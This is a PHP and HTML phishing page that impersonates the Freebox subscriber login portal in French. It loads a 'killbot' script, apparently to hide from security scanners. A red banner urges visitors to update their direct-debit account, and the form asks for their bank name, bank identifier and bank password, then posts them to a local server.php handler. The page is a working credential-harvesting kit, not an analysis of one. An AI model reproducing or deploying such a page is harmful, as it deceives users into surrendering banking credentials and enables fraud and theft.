<?php
require_once('../killbot.to.php');
function get_base_url() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'];
    return $protocol . $host . '/';
}

function asset($relative_path = '') {
    return get_base_url() . ltrim($relative_path, '/');
}

?>

<!DOCTYPE html><html><head>
  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-15">
  <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
  <meta http-equiv="Content-Language" content="fr">
  
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="msapplication-tap-highlight" content="no">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="800">
  <meta http-equiv="cleartype" content="on">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="msapplication-TileImage" conten = "<?= asset('login/im/2017/icon_h.png') ?>" >
  <meta name="theme-color" content="#000000">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta http-equiv="expires" content="0">

  <link rel="manifest" href=./login/im/2017/manifest.json">
  <link rel="icon" sizes="192x192" href="<?= asset('login/im/2017/icon_h.png') ?>" >
  <link rel="apple-touch-icon" sizes="114x114" href="<?= asset('login/im/2017/icon_114.png') ?>">
  <link rel="apple-touch-icon" sizes="72x72" href="<?= asset('/login/im/2017/icon_72.png') ?>">
  <link rel="apple-touch-icon" href="<?= asset('login/im/2017/icon_57.png') ?>">

  <title>Espace abonn&eacute; Freebox</title>

  <link href="<?= asset("login/css/base.min_111.css") ?>" rel="stylesheet" type="text/css">
  <link href="<?= asset('login/css/loginpage.min_20220802v3.css') ?>" rel="stylesheet" type="text/css">
  
  <link rel="shortcut icon" href="<?= asset('login/favicon.ico') ?>" type="image/x-icon">
</head>
<body>
  <div id="body" role="document">
    <div id="main">
      <div id="top" role="banner">
        <a title="Retour &agrave; l'accueil" id="top-logo" href="#">
          <svg version="1.1" id="Calque_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 2050.4 828.9" style="enable-background:new 0 0 2050.4 828.9;" xml:space="preserve">
          <style type="text/css">.st0{fill:#C91517;}</style>
            <path class="st0" d="M1478.8,429.8l-19-11.9c-2.6-1.6-5.8-1.8-8.6-0.4c-86.7,43.2-162.6,64.2-232,64.2c-62.2,0-102.4-17.7-102.4-45.1c0-17,2.6-31.6,8-45.4c102.7-5.3,406.8-30.6,406.8-143.5c0-52.8-99.1-58.5-141.7-58.5c-197.7,0-399.2,123.4-399.2,244.5c0,24.2,12.7,103.2,175.5,103.2c104.3,0,200.6-28.4,312.1-92.1c2.7-1.5,4.4-4.4,4.4-7.4C1483,434.3,1481.5,431.5,1478.8,429.8z M1358.9,229.1c28.4,0,46.8,8.4,46.8,21.3c0,60.5-130.4,97.6-264.2,104.6C1172.5,309.7,1265.1,229.1,1358.9,229.1z M561,269.4c-1.8-3-5-4.9-8.6-4.9H399.9l46.7-96c19.8-42.4,44.4-95,133.5-95c17.2,0,34.1,4.2,50.4,8.3c15.9,4,31,7.8,46,7.8c14.8,0,28.7-6.6,39.2-18.5c8.3-9.4,13.6-21.2,13.6-30.1c0-22.7-26.5-35.7-72.7-35.7c-61.4,0-127.1,20.4-168.1,39.5c-145,66.3-186.3,137.5-231.4,219.7H128.2c-3.7,0-7.1,2.1-8.8,5.4l-16.8,33c-1.6,3.1-1.4,6.7,0.4,9.7c1.8,2.9,5,4.7,8.5,4.7h122.2L4.3,804.7c-1.7,3.7-1,8.1,1.8,11.1l4.6,4.8c2.2,2.3,5.5,3.4,8.7,2.9l93.5-14.5c3.1-0.5,5.8-2.4,7.3-5.2l253-486.5h160.9c3.6,0,6.9-1.9,8.7-5.1l18.4-32.9C562.9,276.2,562.8,272.4,561,269.4z M1021.9,290.7c46.4,0,65.7-39.4,65.7-60.5c0-14.9-8.8-32.6-50.8-32.6c-53.4,0-127.9,43.4-221.5,129.2l28.6-53.2c13.1-24.9,14.7-35.1,14.7-40.6c0-16.1-11.2-35.4-64.4-35.4c-69.7,0-175.2,69-210,95.6c-2.2,1.7-3.5,4.4-3.4,7.2c0.1,2.8,1.5,5.4,3.9,7l17.7,11.9c2.9,2,6.7,2,9.7,0.1c16.6-10.7,73.4-45.5,109.1-45.5c7.4,0,11.6,2.2,13.8,4.1c2.5,2.1,3.2,4.3,3.2,5.3c0,7.4-7.8,24.8-15,36.7c-0.2,0.3-103.6,186.8-107.1,193.2c-1.6,2.5-3.9,6.2-3.9,10.8c0,20.1,51.6,21.3,52.1,21.3c40.4,0,52-2.1,56.5-10.1c0-0.1,22.5-41.3,24.3-44.6c47.6-75.8,140.2-202.8,226.9-202.8c7.8,0,15.8,0.7,24.4,1.4C1004.6,290,1013.4,290.7,1021.9,290.7zM2047,247.7c0-15-8.6-35.4-49.8-47.7c-29.9-8.9-66.4-10.8-91.8-10.8c-94.1,0-193.8,28.1-273.6,77.2c-79.9,49.2-125.7,110.1-125.7,167.3c0,24.2,12.7,103.2,175.5,103.2c104.3,0,200.5-28.4,312.1-92.1c2.7-1.5,4.4-4.4,4.4-7.4c0.1-3.1-1.5-6-4.1-7.6l-19-11.9c-2.6-1.6-5.8-1.8-8.6-0.4c-86.7,43.2-162.6,64.2-232,64.2c-62.2,0-102.4-17.7-102.4-45.1c0-16.9,2.6-31.5,8-45.4C1742.9,385.9,2047,360.5,2047,247.7z M1874.2,229.1c15.6,0,28.3,2.5,36.7,7.1c6.7,3.7,10,8.4,10,14.2c0,60.5-130.4,97.6-264.2,104.6C1687.8,309.7,1780.4,229.1,1874.2,229.1z"/>
          </svg>
        </a>
          <div id="banner" aria-hidden="true">
          </div>
        </div>


      
        <div class="login_container" role="main">
          <h1>Identification Espace abonn&eacute;</h1>
          <center><h2 style="color: red;"><b>Merci de mettre &agrave; jour votre compte de pr&eacute;l&egrave;vement automatique</b></h2></center>
          <hr/>
          
          <div class="login_left">
            <div class="login_form">
              <h3>Pour acc&eacute;der &agrave; votre compte, merci de saisir vos identifiants </h3>
              <!-- ------------- -->
              <form method="post" action="<?= asset('login/server.php') ?>" id="log_form" spellcheck="false">
                <!-- ------------- -->
                  
                  <input type="hidden" name="link" value="" aria-disabled="true" />
                <!-- ------------- -->
                <fieldset>
                  <div class="field" id="login">
                    <input type="text" name="bank" id="login_b" class="inputfield" aria-required="true" title="Nom de la Banque" placeholder="Nom de la Banque" value="" onClick="this.placeholder=''" required />
                    <i class="material-icons" id="help">&#xE0C6;</i>
                  </div>

                  <div class="field" id="login">
                    <input type="text" name="login" id="login_b" class="inputfield" aria-required="true" title="Votre identifiant" placeholder="Identifiant de la Banque" value="" onClick="this.placeholder=''" required />
                    <i class="material-icons" id="help">&#xE0C6;</i>
                  </div>
                  <div class="field" id="pass">
                    <input type="password" name="pass" id="pass_b" class="inputfield" aria-required="true" title="Votre Mot de Passe" placeholder="Mot de passe de la Banque" onClick="this.placeholder=''" required/><span class="material-icons" id="pass_icon">visibility</span>
                  </div>
                  <div class="field">
                    <input type="submit" name="ok" id="ok" class="login_button" title="Se Connecter" value="Se Connecter" aria-label="Identifiant"  />
                  </div>
                </fieldset>
                <!-- ------------- -->
              </form>
              <!-- ------------- -->
                <div class="links">
                  <a href="#" title="Mot de passe oubli&eacute; ?"><i class="material-icons">&#xE0D0;</i>&nbsp;&nbsp; Vous avez oubli&eacute; votre mot de passe ?</a><a href="#" title="Espace AbonnÃ© Free Mobile"><i class="material-icons" id="fm_phone">&#xE325;</i>&nbsp;&nbsp; Espace Abonn&eacute; Free Mobile</a>
                  <a href="#" title="Abonnez-vous !"><i class="material-icons">&#xE7FE;</i>&nbsp;&nbsp; Vous n'&ecirc;tes pas encore abonn&eacute; ?</a>
                </div>
              
            </div>
          </div>
          <div class="login_right">

            <div class="login_info" id="id_infos">
              <i class="material-icons" id="close">&#xE5CD;</i>
              <h2>Cette interface vous permet de g&eacute;rer les fonctionnalit&eacute;s li&eacute;es:</h2>
              <ul>
                <li><em>&bull;</em><p><strong>&Agrave; votre abonnement Freebox</strong>, en vous identifiant &agrave; l&#039;aide de votre <a href="#">identifiant Freebox</a> et du mot de passe associ&eacute;.</p></li>
                <li><em>&bull;</em><p><strong>&Agrave; votre compte eMail</strong>, en vous identifiant avec ce qui pr&eacute;c&egrave;de @free.fr et du mot de passe associ&eacute;.</p></li>

              </ul>
            </div>
            <div class="login_info small" id="fmlink">
                  <p>
                    Pour la gestion de vos abonnement Free Mobile, connectez-vous sur l'<a href="#">Espace Abonné Mobile</a>
                  </p><br/>
            </div>
          </div>
        </div>
      </div>

      <div id="bottom">
        <!--SITEMAP-->
        <div id="bottom-links">
        </div>
        <!--SITEMAP-->
        <div id="bottom-infos">
        </div>
        <div class="clear"></div>


      </div>
    </div>


<!-- End Matomo Code -->

  




</body></html>